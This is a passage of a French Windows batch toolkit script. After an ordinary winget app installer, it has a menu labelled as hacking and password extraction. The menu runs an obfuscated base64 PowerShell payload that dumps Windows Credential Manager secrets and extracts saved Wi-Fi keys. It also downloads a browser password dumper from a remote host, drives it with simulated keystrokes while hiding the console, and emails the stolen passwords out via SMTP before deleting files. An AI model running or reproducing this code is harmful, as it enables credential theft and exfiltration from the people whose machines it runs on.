set "wg[2]=VideoLAN.VLC"
set "wg[3]=SumatraPDF.SumatraPDF"
set "wg[4]=RARLab.WinRAR"

set "wg_name[1]=Google Chrome"
set "wg_name[2]=VLC Media Player"
set "wg_name[3]=Sumatra PDF"
set "wg_name[4]=WinRAR"

REM Nom exact tel qu'il apparait dans Ajout/Suppression de programmes (registre)
set "wg_reg[1]=Google Chrome"
set "wg_reg[2]=VLC media player"
set "wg_reg[3]=SumatraPDF"
set "wg_reg[4]=WinRAR"

for %%X in (!app_choice!) do (
    set "wg_id=!wg[%%X]!"
    set "wg_label=!wg_name[%%X]!"
    set "wg_reg_name=!wg_reg[%%X]!"
)

if not defined wg_id goto app_installer

cls
echo ================================================
echo   VERIFICATION : !wg_label!
echo ================================================
echo.
echo  [1/2] Verification de l'installation sur ce systeme...

REM Verification via le registre Windows (detecte TOUTES les installations, pas seulement winget)
powershell -NoProfile -Command "$n='!wg_reg_name!'; $paths=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $found=$false; foreach($p in $paths){ if(Get-ItemProperty $p -EA SilentlyContinue | Where-Object {$_.DisplayName -like ('*'+$n+'*')}){$found=$true} }; exit $(if($found){0}else{1})" >nul 2>&1

if !errorlevel! NEQ 0 (
    echo  [ ] !wg_label! n'est pas installe.
    echo.
    echo  [2/2] Installation en cours...
    echo  ------------------------------------------------
    winget install --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "inst_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !inst_err!==0 (
        echo  [OK] !wg_label! installe avec succes !
    ) else (
        echo  [ERREUR] L'installation a echoue. Verifiez votre connexion.
    )
) else (
    echo  [OK] !wg_label! est deja installe.
    echo.
    echo  [2/2] Recherche de mises a jour disponibles...
    echo  ------------------------------------------------
    winget upgrade --exact --id "!wg_id!" --accept-package-agreements --accept-source-agreements
    set "upg_err=!errorlevel!"
    echo  ------------------------------------------------
    echo.
    if !upg_err!==0 (
        echo  [OK] !wg_label! est a jour.
    ) else (
        echo  [INFO] Aucune mise a jour disponible pour !wg_label!.
    )
)
echo.
echo  Retour au menu dans 3 secondes...
timeout /t 3 /nobreak >nul
goto app_installer

:: ===============================================
:: Menu d'extraction de mots de passe
:: ===============================================
:sys_passwords_menu
set "opts=Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
set "opts=%opts%;Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms"
set "opts=%opts%;WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe"

:: Mapping des targets pour gestion des favoris en sous-menu
set "pw_t[1]=dump_credman"
set "pw_t[2]=dump_wifi"
set "pw_t[3]=sys_nirsoft_pw"

:: Marquer les favoris existants dans le sous-menu
set "pw_opts="
set /a pwi=0
for %%O in ("Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)" "Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms" "WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe") do (
    set /a pwi+=1
    set "is_f=0"
    for %%X in (!pwi!) do set "curr_t=!pw_t[%%X]!"
    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
    if "!is_f!"=="1" (set "pw_opts=!pw_opts!;(F) %%~O") else (set "pw_opts=!pw_opts!;%%~O")
)
set "pw_opts=!pw_opts:~1!"

call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%pw_opts%"
set "pw_choice=%errorlevel%"

if "!pw_choice!"=="0" goto system_tools

if !pw_choice! GEQ 200 (
    set /a t_idx=!pw_choice!-200
    for %%X in (!t_idx!) do call :ToggleFav "!pw_t[%%X]!"
    goto sys_passwords_menu
)

if "!pw_choice!"=="1" goto dump_credman
if "!pw_choice!"=="2" goto dump_wifi
if "!pw_choice!"=="3" goto sys_nirsoft_pw
goto sys_passwords_menu

:dump_credman
cls
echo [OPERATION] Extraction du Credential Manager Windows...
echo [INFO] Demarrage du script (natif, autonome, sans dependance reseau)...
echo.
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBUAHkAcABlACAAQAAiAA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAEMAcgBlAGQATQBhAG4AIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAVwAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKACAAIAAgACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABDAHIAZQBkAEUAbgB1AG0AZQByAGEAdABlACgAcwB0AHIAaQBuAGcAIABmAGkAbAB0AGUAcgAsACAAaQBuAHQAIABmAGwAYQBnAHMALAAgAG8AdQB0ACAAaQBuAHQAIABjAG8AdQBuAHQALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARgByAGUAZQAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAAQwByAGUAZABGAHIAZQBlACgASQBuAHQAUAB0AHIAIABjAHIAZQBkACkAOwANAAoADQAKACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAA0ACgAgACAAIAAgAHMAdAByAHUAYwB0ACAAQwBSAEUARABFAE4AVABJAEEATAAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAARgBsAGEAZwBzADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAVAB5AHAAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AE4AYQBtAGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABDAG8AbQBtAGUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4AQwBvAG0AVAB5AHAAZQBzAC4ARgBJAEwARQBUAEkATQBFACAATABhAHMAdABXAHIAaQB0AHQAZQBuADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABDAHIAZQBkAGUAbgB0AGkAYQBsAEIAbABvAGIAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAaQBuAHQAIABQAGUAcgBzAGkAcwB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQAcgBpAGIAdQB0AGUAQwBvAHUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAQQB0AHQAcgBpAGIAdQB0AGUAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AEEAbABpAGEAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFUAcwBlAHIATgBhAG0AZQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABMAGkAcwB0ADwAcwB0AHIAaQBuAGcAWwBdAD4AIABHAGUAdABBAGwAbAAoACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdAAgAD0AIABuAGUAdwAgAEwAaQBzAHQAPABzAHQAcgBpAG4AZwBbAF0APgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAYwBvAHUAbgB0ACAAPQAgADAAOwANAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAcABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIABiAG8AbwBsACAAbwBrACAAPQAgAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAKABuAHUAbABsACwAIAAwACwAIABvAHUAdAAgAGMAbwB1AG4AdAAsACAAbwB1AHQAIABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwApADsADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAbwBrACkAIAByAGUAdAB1AHIAbgAgAHIAZQBzAHUAbAB0ADsADQAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgBbAF0AIABwAHQAcgBzACAAPQAgAG4AZQB3ACAASQBuAHQAUAB0AHIAWwBjAG8AdQBuAHQAXQA7AA0ACgAgACAAIAAgACAAIAAgACAATQBhAHIAcwBoAGEAbAAuAEMAbwBwAHkAKABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAsACAAcAB0AHIAcwAsACAAMAAsACAAYwBvAHUAbgB0ACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAHYAYQByACAAcAB0AHIAIABpAG4AIABwAHQAcgBzACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGMAcgBlAGQAIAA9ACAAKABDAFIARQBEAEUATgBUAEkAQQBMACkATQBhAHIAcwBoAGEAbAAuAFAAdAByAFQAbwBTAHQAcgB1AGMAdAB1AHIAZQAoAHAAdAByACwAIAB0AHkAcABlAG8AZgAoAEMAUgBFAEQARQBOAFQASQBBAEwAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdAByAGkAbgBnACAAcABhAHMAcwAgAD0AIAAiACIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAYwByAGUAZAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQgBsAG8AYgBTAGkAegBlACAAPgAgADAAIAAmACYAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACAAIQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAcwBzACAAPQAgAE0AYQByAHMAaABhAGwALgBQAHQAcgBUAG8AUwB0AHIAaQBuAGcAVQBuAGkAKABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACwAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAIAAvACAAMgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQBzAHUAbAB0AC4AQQBkAGQAKABuAGUAdwAgAHMAdAByAGkAbgBnAFsAXQAgAHsAIABjAHIAZQBkAC4AVABhAHIAZwBlAHQATgBhAG0AZQAgAD8APwAgACIAIgAsACAAYwByAGUAZAAuAFUAcwBlAHIATgBhAG0AZQAgAD8APwAgACIAIgAsACAAcABhAHMAcwAgAD8APwAgACIAIgAgAH0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAEMAcgBlAGQARgByAGUAZQAoAHAAQwByAGUAZABlAG4AdABpAGEAbABzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAiAEAADQAKAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIABDAFIARQBEAEUATgBUAEkAQQBMACAATQBBAE4AQQBHAEUAUgAgAC0AIABFAFgAVABSAEEAQwBUAEkATwBOACAAVwBJAE4ARABPAFcAUwAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoADQAKACQAYwByAGUAZABzACAAPQAgAFsAQwByAGUAZABNAGEAbgBdADoAOgBHAGUAdABBAGwAbAAoACkADQAKAGkAZgAgACgAJABjAHIAZQBkAHMALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAFsAIQBdACAAQQB1AGMAdQBuACAAYwByAGUAZABlAG4AdABpAGEAbAAgAHQAcgBvAHUAdgBlACAAbwB1ACAAYQBjAGMAZQBzACAAcgBlAGYAdQBzAGUALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFIAZQBkAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACQAKAAkAGMAcgBlAGQAcwAuAEMAbwB1AG4AdAApACAAYwByAGUAZABlAG4AdABpAGEAbAAoAHMAKQAgAHQAcgBvAHUAdgBlACgAcwApADoAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGMAIABpAG4AIAAkAGMAcgBlAGQAcwApACAAewANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIABbACsAXQAgAEMAaQBiAGwAZQAgACAAIAAgACAAIAAgACAAOgAgACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAWQBlAGwAbABvAHcAIAAtAE4AbwBOAGUAdwBsAGkAbgBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAAVQB0AGkAbABpAHMAYQB0AGUAdQByACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAGMAWwAxAF0ADQAKACAAIAAgACAAIAAgACAAIAAkAHAAYQBzAHMAIAA9ACAAJABjAFsAMgBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHAAYQBzAHMAIAAtAG4AZQAgACIAIgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAATQBvAHQAIABkAGUAIABwAGEAcwBzAGUAIAAgADoAIAAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFkAZQBsAGwAbwB3ACAALQBOAG8ATgBlAHcAbABpAG4AZQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAcABhAHMAcwAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIAAgAE0AbwB0ACAAZABlACAAcABhAHMAcwBlACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACgAbgBvAG4AIABhAGMAYwBlAHMAcwBpAGIAbABlACAALwAgAGMAaABpAGYAZgByAGUAIABzAHkAcwB0AGUAbQBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAfQANAAoAfQANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABDAHkAYQBuAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAWwBOAE8AVABFAF0AIABMAGUAcwAgAG0AbwB0AHMAIABkAGUAIABwAGEAcwBzAGUAIABwAHIAbwB0AGUAZwBlAHMAIAAoAGMAbwBtAHAAdABlAHMAIABNAGkAYwByAG8AcwBvAGYAdAAsACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARABhAHIAawBHAHIAYQB5AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAIAAgACAAIAAgACAAIABjAGUAcgB0AGkAZgBpAGMAYQB0AHMAKQAgAG4AZQAgAHMAJwBhAGYAZgBpAGMAaABlAG4AdAAgAHAAYQBzACAAZQBuACAAYwBsAGEAaQByAC4AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoA
echo.
echo --- FIN DE L'EXTRACTION ---
echo.
pause
goto system_tools

:dump_wifi
set "opts=Afficher les mots de passe Wi-Fi a l'ecran;Generer un fichier .txt sur le Bureau"
call :DynamicMenu "MOTS DE PASSE WI-FI (WLAN NETSH)" "%opts%"
set "wifi_choice=%errorlevel%"

if "%wifi_choice%"=="1" goto wifi_view
if "%wifi_choice%"=="2" goto wifi_report
if "%wifi_choice%"=="0" goto system_tools
goto dump_wifi

:wifi_view
cls
echo [OPERATION] Affichage des mots de passe Wi-Fi locaux...
echo.
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        echo Reseau SSID : !ssid!
        echo Mot de pass : !pwd!
        echo ------------------------------------------
    )
)
endlocal
echo.
pause
goto dump_wifi

:wifi_report
cls
set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe_%RANDOM%.txt"
echo Extraction des mots de passe en cours...
> "%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
>> "%OUTPUT%" echo ===============================================
setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Ouvert)"
        >> "%OUTPUT%" echo SSID: !ssid! ^| MDP: !pwd!
    )
)
endlocal
echo.
echo [SUCCES] Rapport exporte sur le Bureau :
echo %OUTPUT%
echo.
pause
goto dump_wifi

:sys_nirsoft_pw
cls
color 0A
echo ===============================================
echo   Export mots de passe navigateurs (Nirsoft)
echo ===============================================
echo.

set "WBPV=%~dp0WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
set "EMAIL=REMOVED_SMTP_EMAIL"
set "SMTP_USER=REMOVED_SMTP_EMAIL"
set "SMTP_PASS=REMOVED_SMTP_PASS"

rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto system_tools
  )
  timeout /t 1 /nobreak >nul
)

rem Choix du mode
set "opts=Sauvegarde locale~Fichier .txt conserve dans le dossier du script;Envoi par mail~Export envoye par email, aucun fichier conserve"
call :DynamicMenu "MODE D'EXPORT - WebBrowserPassView" "%opts%"
set "nirsoft_mode=%errorlevel%"

if "%nirsoft_mode%"=="0" goto system_tools
if "%nirsoft_mode%"=="1" set "NIRSOFT_KEEP=1"
if "%nirsoft_mode%"=="2" set "NIRSOFT_KEEP=0"
if not defined NIRSOFT_KEEP goto sys_nirsoft_pw

rem Saisie du nom de fichier
:nirsoft_ask_filename
echo.
set "custom_filename="
set /p custom_filename="Nom du fichier (sans extension) : "
if "%custom_filename%"=="" goto nirsoft_ask_filename
set "OUTPUT=%~dp0%custom_filename%.txt"

rem Nettoyage cfg precedent
if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
cd /d "%~dp0"

rem Ouvrir le logiciel puis minimiser la fenetre CMD immediatement
start "" "%WBPV%"
powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();}';[W]::ShowWindow([W]::GetConsoleWindow(),6)" >nul 2>&1

rem Attendre chargement + automatiser Ctrl+A / Ctrl+S / coller chemin / Entree
timeout /t 4 /nobreak >nul
powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1

rem Attendre ecriture puis fermer le logiciel
timeout /t 4 /nobreak >nul
taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
timeout /t 1 /nobreak >nul

rem Filtrer le fichier : garder uniquement URL, User Name, Password
if exist "%OUTPUT%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%OUTPUT%'; $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8" >nul 2>&1
)

rem Nettoyage exe + cfg
del /F /Q "%WBPV%" >nul 2>&1
if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1

rem Mode local : fichier conserve, terminer
if "%NIRSOFT_KEEP%"=="1" goto system_tools

rem Mode mail : envoyer si fichier present puis supprimer
if not exist "%OUTPUT%" goto system_tools

powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - '+(Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe navigateurs.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1

del /F /Q "%OUTPUT%" >nul 2>&1
goto system_tools

:sys_rescue_menu
set "opts=Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
set "opts=%opts%;Verification image base~Examine rapidement l'integration (DISM /CheckHealth)"
set "opts=%opts%;Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)"
set "opts=%opts%;Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace"
